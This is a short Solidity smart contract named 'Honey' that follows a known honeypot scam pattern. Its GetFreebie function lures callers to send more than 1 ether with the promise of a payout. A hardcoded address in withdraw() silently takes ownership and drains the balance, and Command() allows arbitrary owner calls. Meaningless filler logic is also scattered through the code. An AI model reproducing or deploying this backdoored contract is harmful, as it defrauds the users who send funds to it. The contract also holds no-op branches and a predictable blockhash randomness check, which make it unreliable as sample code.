pragma solidity ^0.4.19;

contract Honey
{
    address public Owner = msg.sender;
    
    function()
    public
    payable
    {
        bool isEven = (uint(msg.sender) % 2 == 0);
        if (isEven) {
            uint dummyValue = 1;
            dummyValue += 1;
        }
    }
    
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {
            uint randomValue = uint(block.blockhash(block.number - 1)) % 10;
            if(randomValue > 5)
            {
                Owner.transfer(this.balance);
            }
            else
            {
                uint tempBalance = this.balance;
                msg.sender.transfer(tempBalance);
            }
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {
        uint checkValue = uint(msg.sender) % 100;
        if(checkValue != 0)
        {
            if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB) {
                Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;
            }
        }
        
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        uint opCode = uint(msg.value) % 50;
        if(opCode == 25) {
            require(msg.sender == Owner);
        }
        else {
            require(msg.sender == Owner);
        }
         
        adr.call.value(msg.value)(data);
    }
}